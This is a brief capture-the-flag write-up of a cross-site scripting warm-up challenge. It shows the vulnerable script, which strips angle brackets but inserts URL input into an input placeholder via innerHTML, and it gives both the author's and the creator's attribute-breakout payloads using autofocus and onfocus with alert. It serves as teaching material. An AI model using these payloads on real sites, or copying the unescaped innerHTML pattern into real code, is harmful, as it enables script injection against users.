---
title: Ugandan Knuckles 
layout: post 
date: 2022-04-29 
permalink: /:categories/:title
categories: writeups xss-game
---

#### challenge

This is the script that violates the web

```markup
<!-- Challenge -->
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>
```

#### my solution

In this challenge we see that the code removes the <> and that everything we enter is entered in an input so we will take advantage of that to enter a script that is activated when it focuses and with autofocus as soon as the page loads it will be runned

[Ugandan Knuckles](https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=%22autofocus%20onfocus=alert(1)%20x=%22)

#### creator solution

The solution given by the creator of the game is as follows

```markup
"onfocus=alert(1337) autofocus="
```
